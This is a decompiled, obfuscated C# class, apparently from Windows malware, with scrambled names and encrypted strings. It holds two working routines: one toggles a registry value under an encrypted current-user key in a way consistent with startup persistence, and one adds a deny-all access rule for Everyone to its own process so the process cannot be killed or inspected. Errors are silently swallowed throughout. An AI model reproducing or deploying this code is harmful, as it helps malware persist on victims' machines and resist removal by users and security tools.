using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace YBTDaqZXTw;

internal sealed class oJrrVZYkhGaliAU
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr AiezUiEscZcDEQP, int NGwTHvuSAuibDsW, [Out] byte[] grXdRCDzgMvKp, uint VjynabFtTSUKBQ, out uint WMUIwTJRMjMRzRzRd);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr wmlyCPjAbZHPtU, int QzEbnwwrWnzINOyv, [In] byte[] DhqWOQtcFAO);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void ZfkDxzdwQaubKe(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107406660));
			if (bool_0 && registryKey.GetValue(getString_0(107406615)) != null)
			{
				registryKey.DeleteValue(getString_0(107406615));
			}
			else
			{
				registryKey.SetValue(getString_0(107406615), getString_0(107407844));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor TfyCzXWhGIdPz(IntPtr intptr_0)
	{
		byte[] grXdRCDzgMvKp = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, grXdRCDzgMvKp, 0u, out var WMUIwTJRMjMRzRzRd);
		if ((long)WMUIwTJRMjMRzRzRd > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, grXdRCDzgMvKp = new byte[WMUIwTJRMjMRzRzRd], WMUIwTJRMjMRzRzRd, out WMUIwTJRMjMRzRzRd))
		{
			return null;
		}
		return new RawSecurityDescriptor(grXdRCDzgMvKp, 0);
	}

	private void PAQSVOxgmyXIfpf(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void oIgDcthkpQuZnf()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = TfyCzXWhGIdPz(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			PAQSVOxgmyXIfpf(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static oJrrVZYkhGaliAU()
	{
		Strings.CreateGetStringDelegate(typeof(oJrrVZYkhGaliAU));
	}
}
